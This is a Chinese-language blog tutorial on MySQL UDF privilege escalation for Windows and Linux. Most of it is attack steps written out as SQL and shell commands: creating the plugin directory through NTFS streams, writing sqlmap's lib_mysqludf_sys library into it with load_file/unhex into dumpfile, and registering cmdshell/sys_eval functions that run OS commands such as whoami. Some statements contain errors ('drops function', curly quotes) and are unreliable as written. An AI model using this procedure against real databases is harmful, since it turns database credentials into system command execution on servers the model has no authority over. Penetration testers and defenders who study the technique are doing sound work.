---
layout: post
title: MySQL UDF Rights
date: 2019-9-26
categories: blog
tags: [WEB]
description: 文艺的流氓。
---

### 1.UDF是什么

UDF（user defined function）用户自定义函数,是MySQL的一个扩展接口，称为用户自定义函数,是用来拓展MySQL的技术手段，用户通过自定义函数来实现在MySQL中无法实现的功能。文件后缀为`.dll`,常用c语言编写。可以执行系统命令,将MySQL账号root转化为系统system权限。

### 2.windows下udf提权的条件

1. 如果MySQL的版本大于5.1，`udf.dll`文件必须放在MySQL的安装目录`lib\plugin`文件夹下
2. 如果MySQL的版本小于5.1，`udf.dll`文件在`windows server 2003`下放置在`c:\windows\system32`,在`windows server 2000` 下放在`c:\winnt\system32`目录
3. 掌握MySQL数据库账户,从拥有对MySQL有增删改查权限。如果是root用户就更好了
4. 拥有可以将`udf.dll`写入相应目录的权限

### 3.提权方法

1. 获取MySQL的安装路径。使用`show variables like '%plugins%';`
2. 获取MySQL数据库的版本`select version();`
3. sqlmap中有现在的`udf`文件。分别是32位和64位的。需要选择对应的版本否则就会报错。版本是MySQL的版本不是window的版本.除了MySQL的`udf`文件还有`postgresql`

![](https://wujinlin-blog.oss-cn-beijing.aliyuncs.com/img/20190926170548.png)

4. postgresql 也是同样分为window和Linux

![](https://wujinlin-blog.oss-cn-beijing.aliyuncs.com/img/20190926170629.png)

5. **导出路径**

   1. MySQL版本小于5.1

   ```txt
   C:\\Windows\system32\udf.dll
   ```

   2. MySQL版本大于5.1

   ```txt
   MySQL安装路径\lib\plugin\udf.dll
   ```

   3. 由于该目录默认不存在，需要利用创建这个目录，然后将`udf.dll`导出到该目录。

6. 创建libplugin方法：

   - 利用WebShell创建
   - 利用NTFS ADS流创建目录：

   ```sql
   select @@basedir; //查找到mysql的目录 
    
   select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION'; //利用NTFS ADS创建lib目录 
    
   select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';//利用NTFS ADS创建plugin目录
   ```

7. 创建cmdshell函数

   ```sql
   create function cmdshell returns string soname ‘udf.dll’; 
   ```

8. 执行命令

   ```sql
   select cmdshell(‘whoami’);
   ```

9. 删除函数

   ```sql
   drops function cmdshell;//将函数删除
   ```

10. 导出的SQL语句

    ```sql
    create table a (cmd LONGBLOB);
    
    insert into a (cmd) values (hex(load_file('D:\\Program Files\\MySQL\\MySQL Server 5.0\\Lib\\Plugin\\lib_mysqludf_sys.dll'))); 
    
    SELECT unhex(cmd) FROM a INTO DUMPFILE 'c:\\windows\\system32\\udf.dll';
    
    create function sys_eval returns string soname 'udf.dll'
    
    select sys_eval('ipconfig');
    ```



### 4.Linux下的提权

**要求**

1. 在MySQL库下必须有func表，并且在‑‑skip‑grant‑tables开启的情况下，UDF会被禁止；
2. SQL具有权限，root权限
3. 导出目录可写

**获取插件路径**

```sql
mysql> show variables like "%plugin%";
+---------------+-----------------------+
| Variable_name | Value         |
+---------------+-----------------------+
| plugin_dir  | /usr/lib/mysql/plugin |
+---------------+-----------------------+
1 row in set (0.00 sec)
```



**获取udf文件**

```shell
root@kali:/pentest/sqlmap/udf/mysql# ls
linux windows
root@kali:/pentest/sqlmap/udf/mysql/linux# ls
32 64
root@kali:/pentest/sqlmap/udf/mysql/linux/64# ls
lib_mysqludf_sys.so
```

**在SQL中加载库文件**

```sql
mysql> select hex(load_file('/pentest/database/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so')) into outfile '/tmp/udf.txt';
Query OK, 1 row affected (0.04 sec)
```

**写入udf库到MySQL目录**

```sql
mysql> select unhex('7F454C46020...') into dumpfile '/usr/lib/mysql/plugin/mysqludf.so';
Query OK, 1 row affected (0.04 sec)
```

**加载函数执行命令**

```sql
mysql> create function sys_eval returns string soname "mysqludf.so";
Query OK, 0 rows affected (0.14 sec)
  
mysql> select sys_eval('whoami');
+--------------------+
| sys_eval('whoami') |
+--------------------+
| mysql       |
+--------------------+
1 row in set (0.04 sec)
  
mysql> select * from mysql.func;
+----------+-----+-------------+----------+
| name   | ret | dl     | type   |
+----------+-----+-------------+----------+
| sys_eval |  0 | mysqludf.so | function |
+----------+-----+-------------+----------+
1 row in set
```



### 总结

MySQL提权总的来说还是需要有条件限制的。但是在某些情况下这种提权方法往往是最有效的。


